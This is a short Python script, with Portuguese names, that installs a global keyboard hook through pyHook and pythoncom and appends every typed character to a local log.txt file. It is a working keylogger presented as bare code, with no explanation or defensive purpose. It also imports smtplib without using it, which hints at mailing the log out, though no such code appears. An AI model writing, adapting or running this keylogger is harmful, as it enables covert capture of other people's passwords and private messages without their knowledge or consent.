import pythoncom, pyHook, smtplib

def registrarTecla(evento):
    arquivo = open("log.txt", "a")
    teclas = chr(evento.Ascii)
    arquivo.write(teclas)

hook = pyHook.HookManager()
hook.KeyDown = registrarTecla
hook.HookKeyboard()
pythoncom.PumpMessages()
